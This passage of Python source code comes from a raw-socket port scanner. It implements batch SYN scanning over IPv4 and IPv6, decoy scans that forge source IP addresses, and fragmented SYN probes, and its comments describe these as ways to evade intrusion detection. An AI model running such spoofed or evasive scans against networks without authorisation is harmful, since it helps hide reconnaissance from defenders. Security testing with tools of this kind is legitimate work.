        if a == 198 and b in (51, 52) and c == 100:        continue  # TEST-NET-2/3
        if a == 203 and b == 0 and c == 113:               continue  # TEST-NET-3
        return f"{a}.{b}.{c}.{d}"


def _build_decoy_syn(decoy_ip: str, dst_ip: str,
                      dst_port: int) -> bytes:
    """
    Build a SYN packet with spoofed source IP (decoy_ip).
    Random src_port and ISN so decoy packets look realistic.
    """
    src_port = random.randint(32768, 60999)
    isn      = random.randint(0, 0xFFFFFFFF)
    return _build_syn_packet(decoy_ip, dst_ip, src_port, dst_port, isn)


def send_decoys(send_sock: socket.socket,
                dst_ip: str, dst_port: int,
                decoy_ips: List[str]) -> None:
    """
    [ENH-9] Send one spoofed SYN from each decoy IP to (dst_ip, dst_port).
    Silently ignores send errors (decoy IPs may be unreachable/filtered).
    """
    for decoy_ip in decoy_ips:
        try:
            pkt = _build_decoy_syn(decoy_ip, dst_ip, dst_port)
            send_sock.sendto(pkt, (dst_ip, 0))
        except OSError:
            pass


def syn_scan_with_decoys(ip: str, ports: List[int],
                          timeout: float,
                          decoy_ips: Optional[List[str]] = None,
                          num_decoys: int = 5,
                          stateless: bool = False,
                          ) -> Dict[int, PortResult]:
    """
    [ENH-9] SYN scan with decoy packets interspersed.

    For each real probe:
        1. Send ``num_decoys`` spoofed SYNs from random/specified decoy IPs
        2. Send the real SYN from our actual IP
        3. Collect replies normally (only real probe gets SYN-ACK)

    Parameters:
        decoy_ips   — explicit list of decoy IPs; if None, generates random ones
        num_decoys  — number of decoys per probe (default 5, like Nmap)
        stateless   — use stateless ISN encoding for the real probes

    Decoy ordering mirrors Nmap default: decoys are sent BEFORE the real
    probe so the real SYN arrives last and is buried in the log tail.
    """
    if decoy_ips is None:
        decoy_ips = [_random_decoy_ip() for _ in range(num_decoys)]

    results: Dict[int, PortResult] = {
        p: PortResult(port=p, protocol="tcp",
                      state="filtered", reason="no-response")
        for p in ports
    }
    if not ports or is_ipv6(ip):
        # Decoy scan requires IPv4 raw socket with spoofed src; skip for IPv6
        return syn_batch_scan_v6(ip, ports, timeout) if is_ipv6(ip) \
               else results

    src_ip = get_local_ip(ip)

    try:
        send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  socket.IPPROTO_RAW)
        send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  socket.IPPROTO_TCP)
        recv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF,
                             8 * 1024 * 1024)
        recv_sock.settimeout(0.5)
    except (PermissionError, OSError):
        return syn_batch_scan(ip, ports, timeout)

    allocated: List[int] = []
    probe_map: Dict[int, int] = {}   # src_port → dst_port (real probes only)
    seen:      set             = set()

    try:
        # ── Send phase: decoys + real probe per port ──────────────────
        for dst_port in ports:
            # 1. Fire decoy SYNs first
            send_decoys(send_sock, ip, dst_port, decoy_ips)

            # 2. Real probe — stateless or stateful
            if stateless:
                isn      = _stateless_isn(_STATELESS_SECRET, ip, dst_port)
                src_port = _STATELESS_SRC_PORT
                pkt      = _build_syn_packet(src_ip, ip, src_port,
                                              dst_port, isn)
            else:
                src_port = _PORT_ALLOC.alloc()
                allocated.append(src_port)
                isn      = random.randint(0, 0xFFFFFFFF)
                pkt      = _build_syn_packet(src_ip, ip, src_port,
                                              dst_port, isn)
                probe_map[src_port] = dst_port

            if _RATE_LIMITER is not None:
                _RATE_LIMITER.consume(1)
            try:
                send_sock.sendto(pkt, (ip, 0))
            except OSError:
                pass

        # ── Receive phase ─────────────────────────────────────────────
        deadline = time.time() + timeout
        while time.time() < deadline and len(seen) < len(ports):
            try:
                data, addr = recv_sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                break

            if addr[0] != ip or len(data) < 40:
                continue
            if data[9] != socket.IPPROTO_TCP:
                continue

            ihl     = (data[0] & 0x0F) * 4
            if len(data) < ihl + 20:
                continue
            tcp_dst = struct.unpack("!H", data[ihl+2: ihl+4])[0]
            tcp_src = struct.unpack("!H", data[ihl:   ihl+2])[0]
            flags   = data[ihl + 13]
            ack_num = struct.unpack("!I", data[ihl+8: ihl+12])[0]
            seq_num = struct.unpack("!I", data[ihl+4: ihl+8])[0]

            # Resolve dst_port
            dst_port: Optional[int] = None
            if stateless:
                if tcp_dst == _STATELESS_SRC_PORT:
                    if flags & 0x12:
                        dst_port = _stateless_recover_port(
                            _STATELESS_SECRET, ip, ack_num, ports)
                    elif flags & 0x04:
                        dst_port = _stateless_recover_port(
                            _STATELESS_SECRET, ip, ack_num, ports)
                        if dst_port is None:
                            for p in ports:
                                if _stateless_isn(_STATELESS_SECRET,
                                                   ip, p) == seq_num:
                                    dst_port = p; break
            else:
                if tcp_dst in probe_map:
                    dp_candidate = probe_map[tcp_dst]
                    if tcp_src == dp_candidate:
                        dst_port = dp_candidate

            if dst_port is None or dst_port not in results:
                continue

            r = results[dst_port]
            if flags & 0x12:    # SYN-ACK → open
                r.state   = "open"
                r.reason  = "syn-ack"
                r.service = service_name(dst_port)
                tcp_win   = struct.unpack("!H", data[ihl+14:ihl+16])[0]
                df        = bool(struct.unpack("!H", data[6:8])[0] & 0x4000)
                r._fp_tcp_window      = tcp_win
                r._fp_df_bit          = df
                r._fp_has_tcp_options = (data[ihl+12] >> 4) * 4 > 20
                _send_rst(src_ip, ip, tcp_dst, dst_port, seq_num + 1)
                seen.add(dst_port)
            elif flags & 0x04:  # RST → closed
                r.state  = "closed"
                r.reason = "reset"
                seen.add(dst_port)

    finally:
        send_sock.close()
        recv_sock.close()
        for p in allocated:
            _PORT_ALLOC.free(p)

    return results


# ═══════════════════════════════════════════════════════════════════
# [ENH-10] IP FRAGMENTATION  (IDS evasion)
# ═══════════════════════════════════════════════════════════════════
#
# Traditional IDS/IPS systems reassemble TCP flows at the application
# layer but may miss a connection if the TCP header is split across
# two IP fragments.  Some stateless packet inspection engines fail to
# reassemble fragments at line rate.
#
# Fragment layout (offset in units of 8 bytes, min fragment 8 bytes):
#
#   Fragment 1:
#     IP header  (20 bytes, MF=1, frag_offset=0)
#     First 8 bytes of TCP header (src/dst port + seq)
#
#   Fragment 2:
#     IP header  (20 bytes, MF=0, frag_offset=1 → byte offset 8)
#     Remaining TCP header bytes + options
#
# Target reassembles before passing to TCP stack, so the connection
# attempt itself is valid.  Modern stateful firewalls reassemble and
# inspect correctly; older ACLs and IDS may not.
#
# NOTE: IP fragmentation of TCP SYNs is blocked by many modern OSes
# and firewalls (Path MTU Discovery).  Use only when testing older
# or misconfigured networks.  The --fragment flag enables this mode.
# ═══════════════════════════════════════════════════════════════════

def _build_fragmented_syn(src_ip: str, dst_ip: str,
                           src_port: int, dst_port: int,
                           seq: int) -> Tuple[bytes, bytes]:
    """
    [ENH-10] Build a SYN packet split into two IP fragments.

    Fragment 1 carries bytes 0–7 of the TCP header (src_port, dst_port,
    seq_num, ack_num).  Fragment 2 carries bytes 8–end (data offset,
    flags, window, checksum, urgent, options).

    The TCP checksum is computed over the COMPLETE TCP segment before
    splitting (as required by RFC 791) and embedded in fragment 2.
    Both fragments share the same IP ID (required for reassembly).

    Returns (frag1_bytes, frag2_bytes).
    """
    ip_src = socket.inet_aton(src_ip)
    ip_dst = socket.inet_aton(dst_ip)
    ip_id  = random.randint(0, 0xFFFF)
    ttl    = random.choice([64, 64, 64, 128])

    # ── Build complete TCP segment (no checksum yet) ──────────────
    tcp_opts   = _build_tcp_options()
    data_off   = (20 + len(tcp_opts)) // 4
    tcp_seg_nc = struct.pack("!HHLLBBHHH",
        src_port, dst_port,
        seq, 0,
        data_off << 4, 0x02,   # SYN
        65535, 0, 0,
    ) + tcp_opts

    # TCP checksum over full segment
    pseudo  = struct.pack("!4s4sBBH",
        ip_src, ip_dst, 0, socket.IPPROTO_TCP, len(tcp_seg_nc))
    tcp_chk = checksum(pseudo + tcp_seg_nc)
    tcp_seg = (tcp_seg_nc[:16]
               + struct.pack("!H", tcp_chk)
               + tcp_seg_nc[18:])

    # ── Fragment the TCP segment at byte offset 8 ────────────────
    # frag_offset is in units of 8 bytes.
    # Fragment 1: bytes 0–7 of tcp_seg (MF=1, offset=0)
    # Fragment 2: bytes 8–end of tcp_seg (MF=0, offset=1)
    tcp_part1 = tcp_seg[:8]
    tcp_part2 = tcp_seg[8:]

    def _ip_hdr(total_len: int, frag_off_words: int,
                more_frags: bool) -> bytes:
        flags_frag = ((1 << 13) if more_frags else 0) | frag_off_words
        hdr_nc = struct.pack("!BBHHHBBH4s4s",
            0x45, 0, total_len, ip_id, flags_frag,
            ttl, socket.IPPROTO_TCP, 0,
            ip_src, ip_dst)
        chk = checksum(hdr_nc)
        return struct.pack("!BBHHHBBH4s4s",
            0x45, 0, total_len, ip_id, flags_frag,
            ttl, socket.IPPROTO_TCP, chk,
            ip_src, ip_dst)

    frag1 = _ip_hdr(20 + len(tcp_part1),
                     frag_off_words=0, more_frags=True)  + tcp_part1
    frag2 = _ip_hdr(20 + len(tcp_part2),
                     frag_off_words=1, more_frags=False) + tcp_part2

    return frag1, frag2


def fragmented_syn_scan(ip: str, ports: List[int],
                         timeout: float,
                         decoy_ips: Optional[List[str]] = None,
                         ) -> Dict[int, PortResult]:
    """
    [ENH-10] SYN scan using fragmented IP packets.

    Each SYN is split into two IP fragments.  Optionally also sends
    decoy fragments before the real probe.

    Falls back to syn_batch_scan() if:
      • Raw sockets unavailable (no root)
      • Target is IPv6 (fragmentation header differs; not implemented)
    """
    results: Dict[int, PortResult] = {
        p: PortResult(port=p, protocol="tcp",
                      state="filtered", reason="no-response")
        for p in ports
    }
    if not ports or is_ipv6(ip):
        return results

    src_ip = get_local_ip(ip)

    try:
        send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  socket.IPPROTO_RAW)
        send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  socket.IPPROTO_TCP)
        recv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF,
                             4 * 1024 * 1024)
        recv_sock.settimeout(0.5)
    except (PermissionError, OSError):
        return syn_batch_scan(ip, ports, timeout)

    allocated: List[int] = []
    probe_map: Dict[int, int] = {}
    seen:      set             = set()

    try:
        for dst_port in ports:
            src_port = _PORT_ALLOC.alloc()
            allocated.append(src_port)
            isn      = random.randint(0, 0xFFFFFFFF)
            probe_map[src_port] = dst_port

            # Optional decoy fragments
            if decoy_ips:
                for decoy_ip in decoy_ips:
                    try:
                        d_sport = random.randint(32768, 60999)
                        f1, f2  = _build_fragmented_syn(
                            decoy_ip, ip, d_sport, dst_port,
                            random.randint(0, 0xFFFFFFFF))
                        send_sock.sendto(f1, (ip, 0))
                        send_sock.sendto(f2, (ip, 0))
                    except OSError:
                        pass

            # Real fragmented SYN
            frag1, frag2 = _build_fragmented_syn(
                src_ip, ip, src_port, dst_port, isn)

            if _RATE_LIMITER is not None:
                _RATE_LIMITER.consume(1)
            try:
                send_sock.sendto(frag1, (ip, 0))
                send_sock.sendto(frag2, (ip, 0))
            except OSError:
                pass

        # Receive loop — same as syn_batch_scan (target reassembles,
        # replies come back as normal SYN-ACK / RST)
        deadline = time.time() + timeout
        while time.time() < deadline and len(seen) < len(ports):
            try:
                data, addr = recv_sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            if addr[0] != ip or len(data) < 40:
                continue
            if data[9] != socket.IPPROTO_TCP:
                continue
            ihl = (data[0] & 0x0F) * 4
            if len(data) < ihl + 20:
                continue
            tcp_dst = struct.unpack("!H", data[ihl+2:ihl+4])[0]
            tcp_src = struct.unpack("!H", data[ihl:  ihl+2])[0]
            flags   = data[ihl + 13]
            seq_num = struct.unpack("!I", data[ihl+4:ihl+8])[0]

            if tcp_dst not in probe_map:
                continue
            if tcp_src != probe_map[tcp_dst]:
                continue

            r = results[probe_map[tcp_dst]]
            if flags & 0x12:
                r.state   = "open"
                r.reason  = "syn-ack (frag)"
                r.service = service_name(probe_map[tcp_dst])
                _send_rst(src_ip, ip, tcp_dst,
                           probe_map[tcp_dst], seq_num + 1)
                seen.add(probe_map[tcp_dst])
            elif flags & 0x04:
                r.state  = "closed"
                r.reason = "reset"
                seen.add(probe_map[tcp_dst])

    finally:
        send_sock.close()
        recv_sock.close()
        for p in allocated:
            _PORT_ALLOC.free(p)

    return results


# ─────────────────────────────────────────────
# [FIX-20, FIX-24] Shared-socket SYN batch engine
# ─────────────────────────────────────────────
# Professional scanners (Nmap, Masscan) use ONE send socket and ONE
# receive socket for an entire host, not a new socket per port.
# This avoids per-port socket overhead and lets us:
#   1. Send all SYN probes first (fast burst)
#   2. Collect all replies in a single receive loop
# This is the send/receive split ("async-style") Masscan uses.
# ─────────────────────────────────────────────

def syn_batch_scan(ip: str, ports: List[int],
                   timeout: float) -> Dict[int, PortResult]:
    """
    [FIX-20] Batch SYN scan: ONE send socket + ONE receive socket per host.
    [FIX-24] Send all probes first, then collect all replies.
    [FIX-25] Unique ephemeral source ports via _PORT_ALLOC (no collisions).
    [FIX-26] Respects global _RATE_LIMITER token bucket if set.
    [ENH-2]  IPv6 targets routed to syn_batch_scan_v6() automatically.
    [V9-1]   PacketCapture (libpcap+BPF) used as recv backend if available.
    [V9-4]   EpollReceiver drains socket non-blocking for lower CPU usage.

    Returns {port: PortResult} for every port. Falls back to connect scan
    if raw sockets are unavailable.
    """
    results: Dict[int, PortResult] = {
        p: PortResult(port=p, protocol="tcp",
                      state="filtered", reason="no-response")
        for p in ports
    }

    if not ports:
        return results

    # [ENH-2] Route IPv6 to dedicated v6 engine
    if is_ipv6(ip):
        return syn_batch_scan_v6(ip, ports, timeout)

    src_ip = get_local_ip(ip)

    # [V9-1] Try libpcap first; fall back to raw socket
    cap = PacketCapture(
        dst_ip     = ip,
        bpf_filter = f"tcp and host {ip}",
        timeout_ms = 50,
    )
    cap.open()   # sets cap._use_pcap = True if libpcap available

    try:
        send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  socket.IPPROTO_TCP)
        send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except (PermissionError, OSError):
        cap.close()
        return results

    # [V9-4] EpollReceiver for the raw fallback path
    if not cap._use_pcap and cap._raw_sock:
        _epoll_rcv = _EpollReceiver(cap._raw_sock)
    else:
        _epoll_rcv = None

    # [FIX-25] src_port -> (dst_port, seq) — each src_port is unique
    probe_map: Dict[int, Tuple[int, int]] = {}
    allocated_ports: List[int] = []

    def _process_packet(data: bytes,
                        seen_ports: set) -> None:
        """Parse one IP+TCP packet and update results."""
        if len(data) < 20 or data[9] != socket.IPPROTO_TCP:
            return
        ip_hdr_len = (data[0] & 0x0F) * 4
        if len(data) < ip_hdr_len + 20:
            return

        # [V9-1] With BPF filter, src IP is already guaranteed to be `ip`.
        # Without BPF, verify it here.
        if not cap._use_pcap:
            pkt_src = socket.inet_ntoa(data[12:16])
            if pkt_src != ip:
                return

        reply_dst = struct.unpack(
            "!H", data[ip_hdr_len + 2: ip_hdr_len + 4])[0]
        reply_src = struct.unpack(
            "!H", data[ip_hdr_len    : ip_hdr_len + 2])[0]

        if reply_dst not in probe_map:
            return
        expected_dst, _ = probe_map[reply_dst]
        if reply_src != expected_dst:
            return

        dst_port   = expected_dst
        flags      = data[ip_hdr_len + 13]
        remote_seq = struct.unpack(
            "!L", data[ip_hdr_len + 4: ip_hdr_len + 8])[0]

        r = results[dst_port]
        if flags & 0x12:    # SYN-ACK -> open
            r.state   = "open"
            r.reason  = "syn-ack"
            r.service = service_name(dst_port)
            _send_rst(src_ip, ip, reply_dst, dst_port, remote_seq + 1)

            # [FIX-28] fingerprinting signals
            tcp_win = struct.unpack(
                "!H", data[ip_hdr_len + 14: ip_hdr_len + 16])[0]
            df = bool(struct.unpack("!H", data[6:8])[0] & 0x4000)
            has_opts = (data[ip_hdr_len + 12] >> 4) * 4 > 20
            r._fp_tcp_window      = tcp_win
            r._fp_df_bit          = df
            r._fp_has_tcp_options = has_opts

        elif flags & 0x04:  # RST -> closed
            r.state  = "closed"
            r.reason = "reset"

        seen_ports.add(dst_port)

    try:
        # ── Phase 1: burst-send all SYN probes ──────────────────────────
        for dst_port in ports:
            src_port = _PORT_ALLOC.alloc()
            allocated_ports.append(src_port)
            seq_num  = random.randint(0, 0xFFFFFFFF)
            probe_map[src_port] = (dst_port, seq_num)

            pkt = _build_syn_packet(src_ip, ip, src_port, dst_port, seq_num)

            if _RATE_LIMITER is not None:
                _RATE_LIMITER.consume(1)
            try:
                send_sock.sendto(pkt, (ip, 0))
                if _CONGESTION:
                    _CONGESTION.on_send()
            except OSError:
                pass

        def _collect(deadline: float, seen_ports: set) -> None:
            """
            Collect replies using whichever backend is active:
            • libpcap: call cap.next_packet() in a loop
            • raw socket + epoll: batch-drain via _EpollReceiver
            • raw socket blocking: original recvfrom() path
            """
            if cap._use_pcap:
                # [V9-1] libpcap path
                while time.time() < deadline and len(seen_ports) < len(ports):
                    pkt = cap.next_packet(
                        timeout=min(0.1, deadline - time.time()))
                    if pkt:
                        _process_packet(pkt, seen_ports)
            elif _epoll_rcv:
                # [V9-4] Epoll/select batch-drain path
                while time.time() < deadline and len(seen_ports) < len(ports):
                    remaining = max(0.01, deadline - time.time())
                    packets = _epoll_rcv.recv_packets(
                        timeout=min(0.1, remaining))
                    for pkt in packets:
                        _process_packet(pkt, seen_ports)
            else:
                # Legacy blocking recvfrom (original behaviour)
                while time.time() < deadline and len(seen_ports) < len(ports):
                    try:
                        data, addr = cap._raw_sock.recvfrom(4096) \
                            if cap._raw_sock else (b"", ("", 0))
                        if addr[0] == ip:
                            _process_packet(data, seen_ports)
                    except socket.timeout:
                        time.sleep(0.01)
                    except OSError:
                        break

            # [ENH-1] Congestion tick after each collect window
            if _CONGESTION:
                _CONGESTION.tick()
                _CONGESTION.update_rate_limiter()

        # ── Phase 2: collect initial replies ─────────────────────────────
        seen_ports: set = set()
        _collect(time.time() + timeout, seen_ports)

        # ── Phase 3: [FIX-30] retransmit for unanswered ports ────────────
        for retry in range(SYN_MAX_RETRIES - 1):
            unanswered = [p for p in ports if p not in seen_ports]
            if not unanswered:
                break

            # Re-map new ephemeral src_port for each retransmit
            for dst_port in unanswered:
                new_src = _PORT_ALLOC.alloc()
                allocated_ports.append(new_src)
                seq_num  = random.randint(0, 0xFFFFFFFF)
                probe_map[new_src] = (dst_port, seq_num)

                pkt = _build_syn_packet(src_ip, ip, new_src, dst_port, seq_num)
                if _RATE_LIMITER is not None:
                    _RATE_LIMITER.consume(1)
                try:
                    send_sock.sendto(pkt, (ip, 0))
                except OSError:
                    pass

            _collect(time.time() + timeout, seen_ports)

    finally:
        send_sock.close()
        cap.close()           # [V9-1] closes libpcap handle or raw socket
        if _epoll_rcv:
            _epoll_rcv.close()  # [V9-4]
        for p in allocated_ports:
            _PORT_ALLOC.free(p)   # [FIX-25]

    return results




def tcp_syn_scan(ip: str, port: int, timeout: float) -> PortResult:
    """
    [FIX-36] Thin wrapper — delegates to syn_batch_scan() for a single port.
    The old per-port raw-socket implementation has been removed; the shared
    batch engine is strictly superior (fewer sockets, retransmit, fingerprint).
    Falls back to tcp_connect_scan if raw sockets are unavailable.
    """
    batch = syn_batch_scan(ip, [port], timeout)
    r = batch.get(port)
    if r is None:
        return tcp_connect_scan(ip, port, timeout)
    # If batch returned default filtered+no-response, try connect fallback
    if r.state == "filtered" and r.reason == "no-response":
        return tcp_connect_scan(ip, port, timeout)
    return r





def _build_tcp_options() -> bytes:
    """
    [FIX-21] Build standard TCP options that a real OS would include in a SYN.
    Without these, IDS tools fingerprint the packet as a scanner.

    Options included (mimicking a Linux kernel SYN):
      - MSS (kind=2): Maximum Segment Size = 1460 (standard Ethernet)
      - SACK permitted (kind=4): Selective ACK supported
      - Timestamps (kind=8): val=random, ecr=0 (as in initial SYN)
      - NOP (kind=1): padding
      - Window scale (kind=3): shift count = 7  (window *= 128)

    Total option bytes = 20, so TCP data offset = (20+20)/4 = 10 words.
    """
    mss        = struct.pack("!BBH", 2, 4, 1460)           # MSS = 1460
    sack_perm  = struct.pack("!BB",  4, 2)                  # SACK permitted
    ts_val     = random.randint(100000, 0xFFFFFFFF)
    timestamps = struct.pack("!BBLL", 8, 10, ts_val, 0)     # Timestamps
    nop        = b"\x01"                                     # NOP padding
    win_scale  = struct.pack("!BBB", 3, 3, 7)               # Window scale=7
    options    = mss + sack_perm + timestamps + nop + win_scale
    # Pad to 4-byte boundary
    pad = (4 - len(options) % 4) % 4
    options += b"\x00" * pad
    return options


def _build_syn_packet(src_ip: str, dst_ip: str,
                      src_port: int, dst_port: int,
                      seq: int) -> bytes:
    """
    Build a valid IP/TCP SYN packet with correct checksums.
    [FIX-13] IP header checksum computed and embedded.
    [FIX-16] TCP pseudo-header uses actual tcp_hdr byte length.
    [FIX-19] Randomised IP ID to reduce predictability.
    [FIX-21] TCP options included: MSS + SACK + Timestamps + WinScale.
    [FIX-22] TTL uses OS-realistic values (64 or 128) not suspicious 48-64.
    """
    ip_src = socket.inet_aton(src_ip)
    ip_dst = socket.inet_aton(dst_ip)

    # [FIX-21] Build TCP options
    tcp_opts   = _build_tcp_options()
    data_offset = (20 + len(tcp_opts)) // 4   # TCP header words
    th_off_res  = (data_offset << 4)

    # TCP header with options (no checksum yet)
    tcp_hdr_nc = struct.pack("!HHLLBBHHH",
        src_port, dst_port,
        seq, 0,              # seq, ack=0
        th_off_res, 0x02,    # SYN flag
        65535, 0, 0)         # window=65535, checksum=0, urgent=0
    tcp_hdr_nc += tcp_opts

    # [FIX-16] Pseudo-header uses actual length of full TCP segment
    tcp_len = len(tcp_hdr_nc)
    pseudo  = struct.pack("!4s4sBBH",
        ip_src, ip_dst, 0, socket.IPPROTO_TCP, tcp_len)
    tcp_chk = checksum(pseudo + tcp_hdr_nc)

    # Rebuild TCP header with real checksum embedded at byte offset 16
    tcp_hdr = (tcp_hdr_nc[:16]
               + struct.pack("!H", tcp_chk)
               + tcp_hdr_nc[18:])

    total_len = 20 + tcp_len

    # [FIX-13] IP header: compute checksum
    # [FIX-19] Randomised IP ID
    # [FIX-22] OS-realistic TTL
    rand_ttl = random.choice([64, 64, 64, 128])
    rand_id  = random.randint(0, 0xFFFF)
    ip_hdr_nc = struct.pack("!BBHHHBBH4s4s",
        (4 << 4) | 5, 0, total_len, rand_id, 0,
        rand_ttl, socket.IPPROTO_TCP, 0,
        ip_src, ip_dst)
    ip_chk = checksum(ip_hdr_nc)
    ip_hdr = struct.pack("!BBHHHBBH4s4s",
        (4 << 4) | 5, 0, total_len, rand_id, 0,
        rand_ttl, socket.IPPROTO_TCP, ip_chk,
        ip_src, ip_dst)

    return ip_hdr + tcp_hdr


def _send_rst(src_ip: str, dst_ip: str,
              src_port: int, dst_port: int,
              ack_num: int) -> None:
    """
    [FIX-3] Send RST/ACK with correct seq/ack numbers.
    [FIX-13] IP header checksum now computed and embedded.
    [FIX-19] Randomised TTL for IDS evasion.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                          socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        ip_src = socket.inet_aton(src_ip)
        ip_dst = socket.inet_aton(dst_ip)

        th_off_res = (5 << 4)
        th_flags   = 0x14   # RST + ACK
        tcp_hdr_nc = struct.pack("!HHLLBBHHH",
            src_port, dst_port,
            0, ack_num,
            th_off_res, th_flags,
            0, 0, 0)
        pseudo = struct.pack("!4s4sBBH",
            ip_src, ip_dst, 0, socket.IPPROTO_TCP, len(tcp_hdr_nc))
        tcp_chk = checksum(pseudo + tcp_hdr_nc)
        tcp_hdr = struct.pack("!HHLLBBHHH",
            src_port, dst_port,
            0, ack_num, th_off_res, th_flags, 0, tcp_chk, 0)

        rand_ttl = random.choice([64, 64, 64, 128])   # [FIX-22] OS-realistic TTL
        rand_id  = random.randint(0, 0xFFFF)
        total_len = 20 + len(tcp_hdr)
        # [FIX-13] Compute real IP checksum
        ip_hdr_nc = struct.pack("!BBHHHBBH4s4s",
            (4 << 4) | 5, 0, total_len, rand_id, 0,
            rand_ttl, socket.IPPROTO_TCP, 0,
            ip_src, ip_dst)
        ip_chk = checksum(ip_hdr_nc)
        ip_hdr = struct.pack("!BBHHHBBH4s4s",
            (4 << 4) | 5, 0, total_len, rand_id, 0,
            rand_ttl, socket.IPPROTO_TCP, ip_chk,
            ip_src, ip_dst)

        s.sendto(ip_hdr + tcp_hdr, (dst_ip, 0))
        s.close()
    except Exception:
        pass


# ─────────────────────────────────────────────
# [FIX-4] UDP Scan with ICMP unreachable detection
# ─────────────────────────────────────────────

# ═══════════════════════════════════════════════════════════════════
# [ENH-2] IPv6 SYN SCANNING
# ═══════════════════════════════════════════════════════════════════

def _tcp_checksum_v6(src_ip6: str, dst_ip6: str,
                     tcp_payload: bytes) -> int:
    """
    Compute TCP checksum over IPv6 pseudo-header (RFC 2460 §8.1).
    Pseudo-header: src(16) + dst(16) + tcp_len(4) + zeros(3) + next(1)
    """
    src_b = socket.inet_pton(socket.AF_INET6, src_ip6)
    dst_b = socket.inet_pton(socket.AF_INET6, dst_ip6)
    tcp_len = len(tcp_payload)
    pseudo = (src_b + dst_b
              + struct.pack("!I", tcp_len)
              + b"\x00\x00\x00"
              + bytes([socket.IPPROTO_TCP]))
    return checksum(pseudo + tcp_payload)


def _build_syn_packet_v6(src_ip6: str, dst_ip6: str,
                          src_port: int, dst_port: int,
                          seq_num: int) -> bytes:
    """
    [ENH-2] Build a raw TCP SYN packet for IPv6.

    Note: unlike IPv4, we do NOT prepend the IPv6 header when using
    AF_INET6 SOCK_RAW — the kernel handles the IPv6 header for us.
    We only need to supply the TCP segment.
    """
    # Reuse the same TCP options as IPv4 SYN (MSS+SACK+TS+NOP+WS)
    tcp_opts = _build_tcp_options()
    data_off = (20 + len(tcp_opts)) // 4  # in 4-byte words

    tcp_hdr = struct.pack("!HHLLBBHHH",
        src_port, dst_port,
        seq_num, 0,                # seq, ack=0
        data_off << 4,             # data offset
        0x02,                      # SYN flag
        65535,                     # window
        0, 0,                      # checksum placeholder, urgent
    ) + tcp_opts

    # Compute checksum over IPv6 pseudo-header
    chk = _tcp_checksum_v6(src_ip6, dst_ip6, tcp_hdr)
    # Patch checksum at bytes 16-17 of TCP header
    tcp_hdr = tcp_hdr[:16] + struct.pack("!H", chk) + tcp_hdr[18:]
    return tcp_hdr


def syn_batch_scan_v6(ip6: str, ports: List[int],
                      timeout: float) -> Dict[int, PortResult]:
    """
    [ENH-2] Batch SYN scan for IPv6 targets.

    Architecture mirrors syn_batch_scan() for IPv4:
      1. Open AF_INET6 SOCK_RAW send + receive sockets
      2. Burst all SYN probes (kernel adds IPv6 header)
      3. Single receive loop with port correlation
      4. Retransmit unanswered ports up to SYN_MAX_RETRIES times

    Falls back to tcp_connect_scan per port if privileges unavailable.
    """
    results: Dict[int, PortResult] = {
        p: PortResult(port=p, protocol="tcp",
                      state="filtered", reason="no-response")
        for p in ports
    }

    try:
        # Get local IPv6 source address
        probe_sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        probe_sock.connect((ip6, 80))
        src_ip6 = probe_sock.getsockname()[0]
        probe_sock.close()
    except Exception:
        src_ip6 = "::1"

    try:
        send_sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW,
                                  socket.IPPROTO_TCP)
        recv_sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW,
                                  socket.IPPROTO_TCP)
        recv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF,
                             4 * 1024 * 1024)
        recv_sock.settimeout(0.5)
    except (PermissionError, OSError):
        # No raw socket access → connect-scan each port
        for p in ports:
            results[p] = tcp_connect_scan(ip6, p, timeout)
        return results

    probe_map: Dict[int, Tuple[int, int]] = {}   # src_port → (dst_port, seq)
    allocated: List[int] = []
    seen_ports: set = set()

    def _send_batch(port_list: List[int]) -> None:
        for dst_port in port_list:
            src_port = _PORT_ALLOC.alloc()
            allocated.append(src_port)
            seq_num  = random.randint(0, 0xFFFFFFFF)
            probe_map[src_port] = (dst_port, seq_num)
            pkt = _build_syn_packet_v6(src_ip6, ip6, src_port, dst_port, seq_num)
            if _RATE_LIMITER:
                _RATE_LIMITER.consume(1)
            try:
                send_sock.sendto(pkt, (ip6, 0, 0, 0))
            except OSError:
                pass

    def _recv_batch(deadline: float) -> None:
        while time.time() < deadline and len(seen_ports) < len(ports):
            try:
                data, addr = recv_sock.recvfrom(4096)
            except socket.timeout:
                time.sleep(0.01)
                continue
            except OSError:
                break
            # AF_INET6 raw: no IPv6 header prepended, data IS the TCP segment
            if addr[0] != ip6 or len(data) < 20:
                continue
            reply_dst = struct.unpack("!H", data[2:4])[0]
            reply_src = struct.unpack("!H", data[0:2])[0]
            if reply_dst not in probe_map:
                continue
            dst_port, _ = probe_map[reply_dst]
            if reply_src != dst_port:
                continue
            flags      = data[13]
            remote_seq = struct.unpack("!L", data[4:8])[0]
            r = results[dst_port]
            if flags & 0x12:
                r.state   = "open"
                r.reason  = "syn-ack"
                r.service = service_name(dst_port)
                # Send RST: reuse _send_rst adapted for v6
                try:
                    rst = struct.pack("!HHLLBBHHH",
                        reply_dst, dst_port,
                        0, remote_seq + 1,
                        5 << 4, 0x04, 0, 0, 0)
                    chk = _tcp_checksum_v6(src_ip6, ip6, rst)
                    rst = rst[:16] + struct.pack("!H", chk) + rst[18:]
                    send_sock.sendto(rst, (ip6, 0, 0, 0))
                except Exception:
                    pass
            elif flags & 0x04:
                r.state  = "closed"
                r.reason = "reset"
            seen_ports.add(dst_port)

    try:
        _send_batch(ports)
        _recv_batch(time.time() + timeout)

